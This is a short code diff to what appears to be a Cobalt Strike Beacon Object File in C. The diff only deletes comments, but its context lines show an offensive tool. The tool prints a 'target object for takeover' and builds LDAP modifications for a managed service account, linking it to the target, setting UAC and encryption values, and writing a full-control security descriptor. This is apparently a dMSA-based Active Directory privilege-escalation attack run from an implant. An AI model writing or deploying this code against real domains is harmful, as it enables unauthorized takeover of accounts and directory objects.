@@ -27,10 +27,6 @@ DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDe
 DECLSPEC_IMPORT char *MSVCRT$strcpy(char *dst, const char *src);
 DECLSPEC_IMPORT char *MSVCRT$strcat(char *dst, const char *src);
 
-// ---------------------------------------------------------------------------
-// Entry point
-// ---------------------------------------------------------------------------
-
 void go(char *args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
@@ -94,7 +90,6 @@ void go(char *args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[+] sAMAccountName: %s\n", samAccountName);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Target object for takeover: %s\n", target);
     
-    // If you want to add the LDAP entry, uncomment and use:
     LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam, linkAttr, encAttr, uacAttr, sdAttr;
     LDAPModA *mods[10];
 
@@ -106,8 +101,6 @@ void go(char *args, int len) {
     char *linkVals[] = { target, NULL };
     char *encVals[]  = { "28", NULL };   // 0x1c
     char *uacVals[]  = { "4096", NULL }; // 0x1000
-
-    // Binary SD (msDS-GroupMSAMembership)
 
     char sddl[256];
     MSVCRT$strcpy(sddl, "O:S-1-5-32-544D:(A;;0xf01ff;;;");
